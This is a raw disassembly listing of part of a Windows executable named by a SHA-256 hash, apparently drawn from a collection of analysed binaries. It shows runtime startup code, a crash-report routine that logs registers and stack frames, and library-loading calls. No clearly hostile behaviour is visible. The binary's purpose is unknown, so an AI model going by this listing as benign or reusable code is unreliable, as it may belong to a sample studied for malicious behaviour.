
1b8342c0048e13b323224c48caa9aec2952f3a93ed732c85f160916475910675.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	repz ret 
  401002:	lea    esi,[esi+eiz*1+0x0]
  401009:	lea    edi,[edi+eiz*1+0x0]
  401010:	sub    esp,0x1c
  401013:	xor    eax,eax
  401015:	cmp    WORD PTR ds:0x400000,0x5a4d
  40101e:	mov    DWORD PTR ds:0x40f64c,0x1
  401028:	mov    DWORD PTR ds:0x40f648,0x1
  401032:	mov    DWORD PTR ds:0x40f644,0x1
  40103c:	mov    DWORD PTR ds:0x40f288,0x1
  401046:	je     0x4010b0
  401048:	mov    ds:0x40f008,eax
  40104d:	mov    eax,ds:0x40f658
  401052:	test   eax,eax
  401054:	je     0x4010a0
  401056:	mov    DWORD PTR [esp],0x2
  40105d:	call   0x40ad80
  401062:	mov    DWORD PTR [esp],0xffffffff
  401069:	call   0x402cf0
  40106e:	mov    edx,DWORD PTR ds:0x40f668
  401074:	mov    ds:0x4100a0,eax
  401079:	mov    ds:0x4100a4,eax
  40107e:	mov    eax,ds:0x411344
  401083:	mov    DWORD PTR [eax],edx
  401085:	call   0x4029e0
  40108a:	cmp    DWORD PTR ds:0x40c018,0x1
  401091:	je     0x401100
  401093:	xor    eax,eax
  401095:	add    esp,0x1c
  401098:	ret    
  401099:	lea    esi,[esi+eiz*1+0x0]
  4010a0:	mov    DWORD PTR [esp],0x1
  4010a7:	call   0x40ad80
  4010ac:	jmp    0x401062
  4010ae:	xchg   ax,ax
  4010b0:	mov    edx,DWORD PTR ds:0x40003c
  4010b6:	cmp    DWORD PTR [edx+0x400000],0x4550
  4010c0:	lea    ecx,[edx+0x400000]
  4010c6:	jne    0x401048
  4010c8:	movzx  edx,WORD PTR [ecx+0x18]
  4010cc:	cmp    dx,0x10b
  4010d1:	je     0x401112
  4010d3:	cmp    dx,0x20b
  4010d8:	jne    0x401048
  4010de:	cmp    DWORD PTR [ecx+0x84],0xe
  4010e5:	jbe    0x401048
  4010eb:	mov    edx,DWORD PTR [ecx+0xf8]
  4010f1:	xor    eax,eax
  4010f3:	test   edx,edx
  4010f5:	setne  al
  4010f8:	jmp    0x401048
  4010fd:	lea    esi,[esi+0x0]
  401100:	mov    DWORD PTR [esp],0x402c70
  401107:	call   0x402c60
  40110c:	xor    eax,eax
  40110e:	add    esp,0x1c
  401111:	ret    
  401112:	cmp    DWORD PTR [ecx+0x74],0xe
  401116:	jbe    0x401048
  40111c:	mov    ecx,DWORD PTR [ecx+0xe8]
  401122:	xor    eax,eax
  401124:	test   ecx,ecx
  401126:	setne  al
  401129:	jmp    0x401048
  40112e:	xchg   ax,ax
  401130:	sub    esp,0x2c
  401133:	mov    eax,ds:0x40f640
  401138:	mov    DWORD PTR [esp+0x10],0x40f000
  401140:	mov    DWORD PTR [esp+0x8],0x40f014
  401148:	mov    DWORD PTR [esp+0x4],0x40f018
  401150:	mov    DWORD PTR [esp],0x40f01c
  401157:	mov    ds:0x40f000,eax
  40115c:	mov    eax,ds:0x40f284
  401161:	mov    DWORD PTR [esp+0xc],eax
  401165:	call   0x40ad88
  40116a:	mov    ds:0x40f010,eax
  40116f:	add    esp,0x2c
  401172:	ret    
  401173:	lea    esi,[esi+0x0]
  401179:	lea    edi,[edi+eiz*1+0x0]
  401180:	push   ebp
  401181:	xor    eax,eax
  401183:	mov    ecx,0x11
  401188:	mov    ebp,esp
  40118a:	push   edi
  40118b:	push   esi
  40118c:	lea    edx,[ebp-0x5c]
  40118f:	push   ebx
  401190:	mov    edi,edx
  401192:	sub    esp,0x7c
  401195:	rep stos DWORD PTR es:[edi],eax
  401197:	mov    al,0x30
  401199:	call   0x4039a0
  40119e:	sub    esp,eax
  4011a0:	lea    eax,[esp+0x1b]
  4011a4:	and    eax,0xfffffff0
  4011a7:	mov    DWORD PTR [eax],0xcccccccc
  4011ad:	mov    DWORD PTR [eax+0x4],0xcccccccc
  4011b4:	mov    DWORD PTR [eax+0x8],0xcccccccc
  4011bb:	mov    DWORD PTR [eax+0xc],0xcccccccc
  4011c2:	mov    DWORD PTR [eax+0x10],0xcccccccc
  4011c9:	mov    DWORD PTR [eax+0x14],0xcccccccc
  4011d0:	mov    DWORD PTR [eax+0x18],0xcccccccc
  4011d7:	mov    DWORD PTR [eax+0x1c],0xcccccccc
  4011de:	and    esp,0xfffffff0
  4011e1:	mov    esi,DWORD PTR ds:0x40f658
  4011e7:	test   esi,esi
  4011e9:	jne    0x401470
  4011ef:	mov    eax,fs:0x18
  4011f5:	xor    esi,esi
  4011f7:	mov    ebx,DWORD PTR [eax+0x4]
  4011fa:	mov    edi,DWORD PTR ds:0x4112f8
  401200:	jmp    0x401216
  401202:	cmp    eax,ebx
  401204:	je     0x401411
  40120a:	mov    DWORD PTR [esp],0x3e8
  401211:	call   edi
  401213:	sub    esp,0x4
  401216:	mov    eax,esi
  401218:	lock cmpxchg DWORD PTR ds:0x4100a8,ebx
  401220:	test   eax,eax
  401222:	jne    0x401202
  401224:	mov    eax,ds:0x4100ac
  401229:	xor    ebx,ebx
  40122b:	cmp    eax,0x1
  40122e:	je     0x401424
  401234:	mov    eax,ds:0x4100ac
  401239:	test   eax,eax
  40123b:	je     0x401481
  401241:	mov    DWORD PTR ds:0x40f004,0x1
  40124b:	mov    eax,ds:0x4100ac
  401250:	cmp    eax,0x1
  401253:	je     0x40143e
  401259:	test   ebx,ebx
  40125b:	je     0x401464
  401261:	mov    eax,ds:0x40da78
  401266:	test   eax,eax
  401268:	je     0x401286
  40126a:	mov    DWORD PTR [esp+0x8],0x0
  401272:	mov    DWORD PTR [esp+0x4],0x2
  40127a:	mov    DWORD PTR [esp],0x0
  401281:	call   eax
  401283:	sub    esp,0xc
  401286:	call   0x402fb0
  40128b:	mov    DWORD PTR [esp],0x403280
  401292:	call   DWORD PTR ds:0x4112f4
  401298:	sub    esp,0x4
  40129b:	mov    ds:0x40f66c,eax
  4012a0:	mov    DWORD PTR [esp],0x401000
  4012a7:	call   0x40adb0
  4012ac:	call   0x402cd0
  4012b1:	mov    eax,ds:0x411334
  4012b6:	mov    DWORD PTR ds:0x41009c,0x400000
  4012c0:	mov    eax,DWORD PTR [eax]
  4012c2:	test   eax,eax
  4012c4:	je     0x401314
  4012c6:	xor    ecx,ecx
  4012c8:	jmp    0x4012e1
  4012ca:	lea    esi,[esi+0x0]
  4012d0:	test   dl,dl
  4012d2:	je     0x40130f
  4012d4:	and    ecx,0x1
  4012d7:	je     0x401304
  4012d9:	mov    ecx,0x1
  4012de:	add    eax,0x1
  4012e1:	movzx  edx,BYTE PTR [eax]
  4012e4:	cmp    dl,0x20
  4012e7:	jle    0x4012d0
  4012e9:	mov    ebx,ecx
  4012eb:	xor    ebx,0x1
  4012ee:	cmp    dl,0x22
  4012f1:	cmove  ecx,ebx
  4012f4:	jmp    0x4012de
  4012f6:	lea    esi,[esi+0x0]
  4012f9:	lea    edi,[edi+eiz*1+0x0]
  401300:	test   dl,dl
  401302:	je     0x40130f
  401304:	add    eax,0x1
  401307:	movzx  edx,BYTE PTR [eax]
  40130a:	cmp    dl,0x20
  40130d:	jle    0x401300
  40130f:	mov    ds:0x410098,eax
  401314:	mov    ebx,DWORD PTR ds:0x40f658
  40131a:	test   ebx,ebx
  40131c:	je     0x401333
  40131e:	movzx  edx,WORD PTR [ebp-0x2c]
  401322:	test   BYTE PTR [ebp-0x30],0x1
  401326:	mov    eax,0xa
  40132b:	cmovne eax,edx
  40132e:	mov    ds:0x40c000,eax
  401333:	mov    eax,ds:0x40f01c
  401338:	mov    DWORD PTR [ebp-0x70],eax
  40133b:	mov    esi,eax
  40133d:	lea    eax,[eax*4+0x4]
  401344:	mov    DWORD PTR [ebp-0x74],eax
  401347:	mov    DWORD PTR [esp],eax
  40134a:	call   0x40acf0
  40134f:	test   esi,esi
  401351:	mov    DWORD PTR [ebp-0x6c],eax
  401354:	mov    edi,DWORD PTR ds:0x40f018
  40135a:	jle    0x4014a4
  401360:	xor    ebx,ebx
  401362:	mov    esi,edi
  401364:	mov    eax,DWORD PTR [esi+ebx*4]
  401367:	mov    DWORD PTR [esp],eax
  40136a:	call   0x40acd0
  40136f:	lea    edi,[eax+0x1]
  401372:	mov    DWORD PTR [esp],edi
  401375:	call   0x40acf0
  40137a:	mov    ecx,DWORD PTR [ebp-0x6c]
  40137d:	mov    DWORD PTR [ecx+ebx*4],eax
  401380:	mov    ecx,DWORD PTR [esi+ebx*4]
  401383:	add    ebx,0x1
  401386:	mov    DWORD PTR [esp+0x8],edi
  40138a:	mov    DWORD PTR [esp],eax
  40138d:	mov    DWORD PTR [esp+0x4],ecx
  401391:	call   0x40ace8
  401396:	cmp    ebx,DWORD PTR [ebp-0x70]
  401399:	jne    0x401364
  40139b:	mov    eax,DWORD PTR [ebp-0x74]
  40139e:	sub    eax,0x4
  4013a1:	mov    esi,DWORD PTR [ebp-0x6c]
  4013a4:	mov    DWORD PTR [esi+eax*1],0x0
  4013ab:	mov    DWORD PTR ds:0x40f018,esi
  4013b1:	call   0x4029b0
  4013b6:	mov    eax,ds:0x411320
  4013bb:	mov    edx,DWORD PTR ds:0x40f014
  4013c1:	mov    DWORD PTR [eax],edx
  4013c3:	mov    eax,ds:0x40f014
  4013c8:	mov    DWORD PTR [esp+0x8],eax
  4013cc:	mov    eax,ds:0x40f018
  4013d1:	mov    DWORD PTR [esp+0x4],eax
  4013d5:	mov    eax,ds:0x40f01c
  4013da:	mov    DWORD PTR [esp],eax
  4013dd:	call   0x40b200
  4013e2:	mov    ecx,DWORD PTR ds:0x40f008
  4013e8:	mov    ds:0x40f00c,eax
  4013ed:	test   ecx,ecx
  4013ef:	je     0x4014ab
  4013f5:	mov    edx,DWORD PTR ds:0x40f004
  4013fb:	test   edx,edx
  4013fd:	jne    0x401409
  4013ff:	call   0x40ad68
  401404:	mov    eax,ds:0x40f00c
  401409:	lea    esp,[ebp-0xc]
  40140c:	pop    ebx
  40140d:	pop    esi
  40140e:	pop    edi
  40140f:	pop    ebp
  401410:	ret    
  401411:	mov    eax,ds:0x4100ac
  401416:	mov    ebx,0x1
  40141b:	cmp    eax,0x1
  40141e:	jne    0x401234
  401424:	mov    DWORD PTR [esp],0x1f
  40142b:	call   0x40ad70
  401430:	mov    eax,ds:0x4100ac
  401435:	cmp    eax,0x1
  401438:	jne    0x401259
  40143e:	mov    DWORD PTR [esp+0x4],0x412008
  401446:	mov    DWORD PTR [esp],0x412000
  40144d:	call   0x40ad58
  401452:	test   ebx,ebx
  401454:	mov    DWORD PTR ds:0x4100ac,0x2
  40145e:	jne    0x401261
  401464:	xchg   DWORD PTR ds:0x4100a8,ebx
  40146a:	jmp    0x401261
  40146f:	nop
  401470:	mov    DWORD PTR [esp],edx
  401473:	call   DWORD PTR ds:0x4112b0
  401479:	sub    esp,0x4
  40147c:	jmp    0x4011ef
  401481:	mov    DWORD PTR ds:0x4100ac,0x1
  40148b:	mov    DWORD PTR [esp+0x4],0x412018
  401493:	mov    DWORD PTR [esp],0x41200c
  40149a:	call   0x40ad58
  40149f:	jmp    0x40124b
  4014a4:	xor    eax,eax
  4014a6:	jmp    0x4013a1
  4014ab:	mov    DWORD PTR [esp],eax
  4014ae:	call   0x40ad40
  4014b3:	lea    esi,[esi+0x0]
  4014b9:	lea    edi,[edi+eiz*1+0x0]
  4014c0:	sub    esp,0xc
  4014c3:	mov    DWORD PTR ds:0x40f658,0x1
  4014cd:	call   0x4029f0
  4014d2:	add    esp,0xc
  4014d5:	jmp    0x401180
  4014da:	lea    esi,[esi+0x0]
  4014e0:	sub    esp,0xc
  4014e3:	mov    DWORD PTR ds:0x40f658,0x0
  4014ed:	call   0x4029f0
  4014f2:	add    esp,0xc
  4014f5:	jmp    0x401180
  4014fa:	nop
  4014fb:	nop
  4014fc:	nop
  4014fd:	nop
  4014fe:	nop
  4014ff:	nop
  401500:	mov    eax,ds:0x40c06c
  401505:	test   eax,eax
  401507:	je     0x40154c
  401509:	push   ebp
  40150a:	mov    ebp,esp
  40150c:	sub    esp,0x18
  40150f:	mov    DWORD PTR [esp],0x40d000
  401516:	call   DWORD PTR ds:0x4112a4
  40151c:	sub    esp,0x4
  40151f:	test   eax,eax
  401521:	mov    edx,0x0
  401526:	je     0x40153e
  401528:	mov    DWORD PTR [esp+0x4],0x40d00e
  401530:	mov    DWORD PTR [esp],eax
  401533:	call   DWORD PTR ds:0x4112ac
  401539:	sub    esp,0x8
  40153c:	mov    edx,eax
  40153e:	test   edx,edx
  401540:	je     0x40154b
  401542:	mov    DWORD PTR [esp],0x40c06c
  401549:	call   edx
  40154b:	leave  
  40154c:	repz ret 
  40154e:	xchg   ax,ax
  401550:	push   ebp
  401551:	mov    ebp,esp
  401553:	pop    ebp
  401554:	ret    
  401555:	nop
  401556:	nop
  401557:	nop
  401558:	nop
  401559:	nop
  40155a:	nop
  40155b:	nop
  40155c:	nop
  40155d:	nop
  40155e:	nop
  40155f:	nop
  401560:	sub    esp,0x1c
  401563:	mov    edx,DWORD PTR [esp+0x24]
  401567:	mov    ecx,DWORD PTR [esp+0x20]
  40156b:	lea    eax,[esp+0x28]
  40156f:	mov    DWORD PTR [esp+0x8],eax
  401573:	mov    DWORD PTR [esp+0x4],edx
  401577:	mov    DWORD PTR [esp],ecx
  40157a:	call   0x4039d0
  40157f:	add    esp,0x1c
  401582:	ret    
  401583:	lea    esi,[esi+0x0]
  401589:	lea    edi,[edi+eiz*1+0x0]
  401590:	sub    esp,0x1c
  401593:	mov    edx,DWORD PTR [esp+0x24]
  401597:	mov    ecx,DWORD PTR [esp+0x20]
  40159b:	lea    eax,[esp+0x28]
  40159f:	mov    DWORD PTR [esp+0x8],eax
  4015a3:	mov    DWORD PTR [esp+0x4],edx
  4015a7:	mov    DWORD PTR [esp],ecx
  4015aa:	call   0x403a10
  4015af:	add    esp,0x1c
  4015b2:	ret    
  4015b3:	lea    esi,[esi+0x0]
  4015b9:	lea    edi,[edi+eiz*1+0x0]
  4015c0:	sub    esp,0x1c
  4015c3:	mov    edx,DWORD PTR [esp+0x20]
  4015c7:	lea    eax,[esp+0x2c]
  4015cb:	mov    DWORD PTR [esp+0x8],0x40d024
  4015d3:	mov    DWORD PTR [esp+0x4],0xb
  4015db:	mov    DWORD PTR [esp+0xc],eax
  4015df:	mov    DWORD PTR [esp],edx
  4015e2:	call   0x403a50
  4015e7:	add    esp,0x1c
  4015ea:	ret    
  4015eb:	nop
  4015ec:	lea    esi,[esi+eiz*1+0x0]
  4015f0:	sub    esp,0x1c
  4015f3:	mov    edx,DWORD PTR [esp+0x20]
  4015f7:	lea    eax,[esp+0x28]
  4015fb:	mov    DWORD PTR [esp+0x4],0x40d02c
  401603:	mov    DWORD PTR [esp+0x8],eax
  401607:	mov    DWORD PTR [esp],edx
  40160a:	call   0x403a10
  40160f:	add    esp,0x1c
  401612:	ret    
  401613:	lea    esi,[esi+0x0]
  401619:	lea    edi,[edi+eiz*1+0x0]
  401620:	sub    esp,0x1c
  401623:	mov    edx,DWORD PTR [esp+0x20]
  401627:	lea    eax,[esp+0x28]
  40162b:	mov    DWORD PTR [esp+0x4],0x40d03c
  401633:	mov    DWORD PTR [esp+0x8],eax
  401637:	mov    DWORD PTR [esp],edx
  40163a:	call   0x403a10
  40163f:	add    esp,0x1c
  401642:	ret    
  401643:	lea    esi,[esi+0x0]
  401649:	lea    edi,[edi+eiz*1+0x0]
  401650:	push   ebp
  401651:	push   edi
  401652:	mov    eax,0x136c
  401657:	push   esi
  401658:	push   ebx
  401659:	call   0x4039a0
  40165e:	sub    esp,eax
  401660:	mov    edx,DWORD PTR ds:0x41134c
  401666:	mov    DWORD PTR [esp+0x4],0x40d048
  40166e:	mov    ebx,DWORD PTR [esp+0x1380]
  401675:	add    edx,0x40
  401678:	mov    DWORD PTR [esp],edx
  40167b:	call   0x401560
  401680:	mov    ecx,DWORD PTR ds:0x40f248
  401686:	mov    DWORD PTR [esp+0x4],0x40d062
  40168e:	mov    DWORD PTR [esp],ecx
  401691:	call   DWORD PTR ds:0x4113b0
  401697:	test   eax,eax
  401699:	mov    esi,eax
  40169b:	je     0x401a89
  4016a1:	lea    ebp,[esp+0x4c]
  4016a5:	xor    eax,eax
  4016a7:	mov    ecx,0x45
  4016ac:	mov    edi,ebp
  4016ae:	rep stos DWORD PTR es:[edi],eax
  4016b0:	mov    DWORD PTR [esp],ebp
  4016b3:	mov    DWORD PTR [esp+0x4c],0x114
  4016bb:	call   DWORD PTR ds:0x4112c0
  4016c1:	sub    esp,0x4
  4016c4:	mov    ecx,DWORD PTR [esp+0x58]
  4016c8:	mov    ebp,DWORD PTR [esp+0x5c]
  4016cc:	lea    edx,[esp+0x60]
  4016d0:	mov    edi,DWORD PTR [esp+0x50]
  4016d4:	mov    eax,DWORD PTR [esp+0x54]
  4016d8:	mov    DWORD PTR [esp+0x18],edx
  4016dc:	mov    DWORD PTR [esp+0x4],0x40d098
  4016e4:	mov    DWORD PTR [esp+0x10],ecx
  4016e8:	mov    DWORD PTR [esp+0x14],ebp
  4016ec:	mov    DWORD PTR [esp+0x8],edi
  4016f0:	mov    DWORD PTR [esp+0xc],eax
  4016f4:	mov    DWORD PTR [esp],esi
  4016f7:	call   0x401590
  4016fc:	mov    ebp,DWORD PTR [ebx]
  4016fe:	mov    edi,DWORD PTR [ebx+0x4]
  401701:	mov    ebx,DWORD PTR [ebp+0xc]
  401704:	mov    DWORD PTR [esp+0xc],ebx
  401708:	mov    edx,DWORD PTR [ebp+0x0]
  40170b:	xor    ebx,ebx
  40170d:	mov    DWORD PTR [esp+0x4],0x40d0f8
  401715:	mov    DWORD PTR [esp],esi
  401718:	mov    DWORD PTR [esp+0x8],edx
  40171c:	call   0x401590
  401721:	mov    ecx,DWORD PTR [ebp+0x10]
  401724:	test   ecx,ecx
  401726:	je     0x401750
  401728:	nop
  401729:	lea    esi,[esi+eiz*1+0x0]
  401730:	mov    eax,DWORD PTR [ebp+ebx*4+0x14]
  401734:	mov    DWORD PTR [esp+0x4],0x40d03c
  40173c:	add    ebx,0x1
  40173f:	mov    DWORD PTR [esp],esi
  401742:	mov    DWORD PTR [esp+0x8],eax
  401746:	call   0x401620
  40174b:	cmp    ebx,DWORD PTR [ebp+0x10]
  40174e:	jb     0x401730
  401750:	mov    ebp,DWORD PTR [edi+0xc4]
  401756:	mov    DWORD PTR [esp+0x28],ebp
  40175a:	mov    edx,DWORD PTR [edi+0xb8]
  401760:	mov    DWORD PTR [esp+0x24],edx
  401764:	mov    ebx,DWORD PTR [edi+0xb4]
  40176a:	mov    DWORD PTR [esp+0x20],ebx
  40176e:	mov    ecx,DWORD PTR [edi+0xb0]
  401774:	mov    DWORD PTR [esp+0x1c],ecx
  401778:	mov    eax,DWORD PTR [edi+0xac]
  40177e:	mov    DWORD PTR [esp+0x18],eax
  401782:	mov    ebp,DWORD PTR [edi+0xa8]
  401788:	mov    DWORD PTR [esp+0x14],ebp
  40178c:	mov    edx,DWORD PTR [edi+0xa4]
  401792:	mov    DWORD PTR [esp+0x10],edx
  401796:	mov    ebx,DWORD PTR [edi+0xa0]
  40179c:	mov    DWORD PTR [esp+0xc],ebx
  4017a0:	mov    ecx,DWORD PTR [edi+0x9c]
  4017a6:	lea    ebx,[esp+0x360]
  4017ad:	mov    DWORD PTR [esp+0x4],0x40d130
  4017b5:	mov    DWORD PTR [esp],esi
  4017b8:	mov    DWORD PTR [esp+0x8],ecx
  4017bc:	call   0x401590
  4017c1:	mov    DWORD PTR [esp+0x4],0x40d1dc
  4017c9:	mov    DWORD PTR [esp],esi
  4017cc:	call   0x401590
  4017d1:	mov    eax,DWORD PTR [edi+0xb8]
  4017d7:	mov    ebp,DWORD PTR [edi+0xb4]
  4017dd:	lea    edi,[esp+0x160]
  4017e4:	mov    DWORD PTR [esp+0x8],0x1c
  4017ec:	mov    DWORD PTR [esp+0x4],edi
  4017f0:	mov    DWORD PTR [esp],eax
  4017f3:	mov    DWORD PTR [esp+0x38],eax
  4017f7:	call   DWORD PTR ds:0x41130c
  4017fd:	sub    esp,0xc
  401800:	mov    edx,DWORD PTR [esp+0x164]
  401807:	mov    DWORD PTR [esp+0x8],0x100
  40180f:	mov    DWORD PTR [esp+0x4],ebx
  401813:	mov    DWORD PTR [esp],edx
  401816:	call   DWORD PTR ds:0x4112a0
  40181c:	sub    esp,0xc
  40181f:	mov    ecx,DWORD PTR [esp+0x38]
  401823:	mov    DWORD PTR [esp+0xc],ebx
  401827:	mov    DWORD PTR [esp+0x4],0x40d02c
  40182f:	mov    DWORD PTR [esp],esi
  401832:	mov    DWORD PTR [esp+0x8],ecx
  401836:	call   0x4015f0
  40183b:	mov    DWORD PTR [esp+0x4],0x8
  401843:	mov    DWORD PTR [esp],ebp
  401846:	call   DWORD PTR ds:0x4112cc
  40184c:	sub    esp,0x8
  40184f:	test   eax,eax
  401851:	jne    0x401995
  401857:	mov    ecx,DWORD PTR [ebp+0x4]
  40185a:	test   ecx,ecx
  40185c:	je     0x401995
  401862:	mov    ebp,DWORD PTR [ebp+0x0]
  401865:	test   ebp,ebp
  401867:	je     0x401995
  40186d:	mov    DWORD PTR [esp+0x3c],0x64
  401875:	jmp    0x401922
  40187a:	lea    esi,[esi+0x0]
  401880:	mov    ecx,DWORD PTR [ebp+0x4]
  401883:	test   ecx,ecx
  401885:	je     0x401995
  40188b:	mov    ebp,DWORD PTR [ebp+0x0]
  40188e:	test   ebp,ebp
  401890:	je     0x401995
  401896:	mov    DWORD PTR [esp],ecx
  401899:	mov    DWORD PTR [esp+0x38],ecx
  40189d:	mov    DWORD PTR [esp+0x8],0x1c
  4018a5:	mov    DWORD PTR [esp+0x4],edi
  4018a9:	call   DWORD PTR ds:0x41130c
  4018af:	sub    esp,0xc
  4018b2:	mov    eax,DWORD PTR [esp+0x164]
  4018b9:	mov    DWORD PTR [esp+0x8],0x100
  4018c1:	mov    DWORD PTR [esp+0x4],ebx
  4018c5:	mov    DWORD PTR [esp],eax
  4018c8:	call   DWORD PTR ds:0x4112a0
  4018ce:	sub    esp,0xc
  4018d1:	mov    edx,DWORD PTR [esp+0x38]
  4018d5:	mov    DWORD PTR [esp+0xc],ebx
  4018d9:	mov    DWORD PTR [esp+0x4],0x40d02c
  4018e1:	mov    DWORD PTR [esp],esi
  4018e4:	mov    DWORD PTR [esp+0x8],edx
  4018e8:	call   0x4015f0
  4018ed:	mov    DWORD PTR [esp+0x4],0x8
  4018f5:	mov    DWORD PTR [esp],ebp
  4018f8:	call   DWORD PTR ds:0x4112cc
  4018fe:	sub    esp,0x8
  401901:	test   eax,eax
  401903:	jne    0x401995
  401909:	mov    ecx,DWORD PTR [ebp+0x4]
  40190c:	test   ecx,ecx
  40190e:	je     0x401995
  401914:	mov    ebp,DWORD PTR [ebp+0x0]
  401917:	test   ebp,ebp
  401919:	je     0x401995
  40191b:	sub    DWORD PTR [esp+0x3c],0x2
  401920:	je     0x401995
  401922:	mov    DWORD PTR [esp],ecx
  401925:	mov    DWORD PTR [esp+0x38],ecx
  401929:	mov    DWORD PTR [esp+0x8],0x1c
  401931:	mov    DWORD PTR [esp+0x4],edi
  401935:	call   DWORD PTR ds:0x41130c
  40193b:	sub    esp,0xc
  40193e:	mov    eax,DWORD PTR [esp+0x164]
  401945:	mov    DWORD PTR [esp+0x8],0x100
  40194d:	mov    DWORD PTR [esp+0x4],ebx
  401951:	mov    DWORD PTR [esp],eax
  401954:	call   DWORD PTR ds:0x4112a0
  40195a:	sub    esp,0xc
  40195d:	mov    edx,DWORD PTR [esp+0x38]
  401961:	mov    DWORD PTR [esp+0xc],ebx
  401965:	mov    DWORD PTR [esp+0x4],0x40d02c
  40196d:	mov    DWORD PTR [esp],esi
  401970:	mov    DWORD PTR [esp+0x8],edx
  401974:	call   0x4015f0
  401979:	mov    DWORD PTR [esp+0x4],0x8
  401981:	mov    DWORD PTR [esp],ebp
  401984:	call   DWORD PTR ds:0x4112cc
  40198a:	sub    esp,0x8
  40198d:	test   eax,eax
  40198f:	je     0x401880
  401995:	call   DWORD PTR ds:0x411294
  40199b:	mov    DWORD PTR [esp+0x4],0x0
  4019a3:	mov    DWORD PTR [esp+0x8],eax
  4019a7:	mov    DWORD PTR [esp],0x410
  4019ae:	call   DWORD PTR ds:0x4112e8
  4019b4:	sub    esp,0xc
  4019b7:	test   eax,eax
  4019b9:	mov    edx,eax
  4019bb:	mov    DWORD PTR [esp+0x38],eax
  4019bf:	je     0x4019f4
  4019c1:	lea    ecx,[esp+0x48]
  4019c5:	mov    DWORD PTR [esp+0x8],0x1000
  4019cd:	mov    DWORD PTR [esp+0x4],ebx
  4019d1:	mov    DWORD PTR [esp],edx
  4019d4:	mov    DWORD PTR [esp+0xc],ecx
  4019d8:	call   0x402848
  4019dd:	sub    esp,0x10
  4019e0:	test   eax,eax
  4019e2:	jne    0x401a20
  4019e4:	mov    ebx,DWORD PTR [esp+0x38]
  4019e8:	mov    DWORD PTR [esp],ebx
  4019eb:	call   DWORD PTR ds:0x41127c
  4019f1:	sub    esp,0x4
  4019f4:	mov    DWORD PTR [esp],esi
  4019f7:	call   0x40ad38
  4019fc:	mov    esi,DWORD PTR ds:0x41134c
  401a02:	add    esi,0x40
  401a05:	mov    DWORD PTR [esp],esi
  401a08:	call   0x40ad30
  401a0d:	mov    DWORD PTR [esp],0x1
  401a14:	call   0x40ad40
  401a19:	lea    esi,[esi+eiz*1+0x0]
  401a20:	mov    DWORD PTR [esp+0x4],0x40d21c
  401a28:	mov    DWORD PTR [esp],esi
  401a2b:	call   0x401590
  401a30:	mov    edx,DWORD PTR [esp+0x48]
  401a34:	shr    edx,0x2
  401a37:	test   edx,edx
  401a39:	je     0x4019e4
  401a3b:	xor    ebp,ebp
  401a3d:	lea    esi,[esi+0x0]
  401a40:	mov    DWORD PTR [esp+0x8],0x100
  401a48:	mov    DWORD PTR [esp+0x4],edi
  401a4c:	mov    eax,DWORD PTR [ebx+ebp*4]
  401a4f:	mov    DWORD PTR [esp],eax
  401a52:	call   DWORD PTR ds:0x4112a0
  401a58:	sub    esp,0xc
  401a5b:	mov    DWORD PTR [esp+0xc],edi
  401a5f:	mov    ecx,DWORD PTR [ebx+ebp*4]
  401a62:	add    ebp,0x1
  401a65:	mov    DWORD PTR [esp+0x4],0x40d02c
  401a6d:	mov    DWORD PTR [esp],esi
  401a70:	mov    DWORD PTR [esp+0x8],ecx
  401a74:	call   0x4015f0
  401a79:	mov    edx,DWORD PTR [esp+0x48]
  401a7d:	shr    edx,0x2
  401a80:	cmp    ebp,edx
  401a82:	jb     0x401a40
  401a84:	jmp    0x4019e4
  401a89:	mov    edi,DWORD PTR ds:0x41134c
  401a8f:	mov    DWORD PTR [esp+0x4],0x40d07c
  401a97:	add    edi,0x40
  401a9a:	mov    DWORD PTR [esp],edi
  401a9d:	call   0x401560
  401aa2:	mov    DWORD PTR [esp],0x1
  401aa9:	call   0x40ad40
  401aae:	xchg   ax,ax
  401ab0:	sub    esp,0x1c
  401ab3:	call   DWORD PTR ds:0x4112d4
  401ab9:	test   eax,eax
  401abb:	je     0x401ac5
  401abd:	xor    eax,eax
  401abf:	add    esp,0x1c
  401ac2:	ret    0x4
  401ac5:	mov    eax,DWORD PTR [esp+0x20]
  401ac9:	mov    DWORD PTR [esp],eax
  401acc:	call   0x401650
  401ad1:	jmp    0x401ae0
  401ad3:	nop
  401ad4:	nop
  401ad5:	nop
  401ad6:	nop
  401ad7:	nop
  401ad8:	nop
  401ad9:	nop
  401ada:	nop
  401adb:	nop
  401adc:	nop
  401add:	nop
  401ade:	nop
  401adf:	nop
  401ae0:	push   ebp
  401ae1:	mov    ebp,esp
  401ae3:	push   edi
  401ae4:	push   esi
  401ae5:	push   ebx
  401ae6:	sub    esp,0x49c
  401aec:	mov    DWORD PTR [esp],0x40d236
  401af3:	call   0x40ac80
  401af8:	mov    DWORD PTR [esp],0x1
  401aff:	call   DWORD PTR ds:0x4112f0
  401b05:	sub    esp,0x4
  401b08:	mov    DWORD PTR [esp+0xc],0x0
  401b10:	mov    DWORD PTR [esp+0x8],0x0
  401b18:	mov    DWORD PTR [esp+0x4],0x1
  401b20:	mov    DWORD PTR [esp],0x0
  401b27:	call   DWORD PTR ds:0x4112c4
  401b2d:	mov    eax,ds:0x4112dc
  401b32:	sub    esp,0x10
  401b35:	mov    DWORD PTR [esp],0x40d244
  401b3c:	mov    DWORD PTR [ebp-0x470],eax
  401b42:	call   eax
  401b44:	sub    esp,0x4
  401b47:	test   eax,eax
  401b49:	mov    ebx,eax
  401b4b:	je     0x401b9f
  401b4d:	mov    DWORD PTR [esp+0x4],0x40d25e
  401b55:	mov    DWORD PTR [esp],eax
  401b58:	mov    esi,DWORD PTR ds:0x4112ac
  401b5e:	call   esi
  401b60:	sub    esp,0x8
  401b63:	test   eax,eax
  401b65:	je     0x401b73
  401b67:	mov    DWORD PTR [esp],0x1
  401b6e:	call   eax
  401b70:	sub    esp,0x4
  401b73:	mov    DWORD PTR [esp+0x4],0x40d272
  401b7b:	mov    DWORD PTR [esp],ebx
  401b7e:	call   esi
  401b80:	sub    esp,0x8
  401b83:	test   eax,eax
  401b85:	je     0x401b93
  401b87:	mov    DWORD PTR [esp],0x40d283
  401b8e:	call   eax
  401b90:	sub    esp,0x4
  401b93:	mov    DWORD PTR [esp],ebx
  401b96:	call   DWORD PTR ds:0x411288
  401b9c:	sub    esp,0x4
  401b9f:	mov    DWORD PTR [esp],0x40d244
  401ba6:	mov    edi,DWORD PTR ds:0x4112a8
  401bac:	call   edi
  401bae:	sub    esp,0x4
  401bb1:	test   eax,eax
  401bb3:	je     0x401bd9
  401bb5:	mov    DWORD PTR [esp+0x4],0x40d284
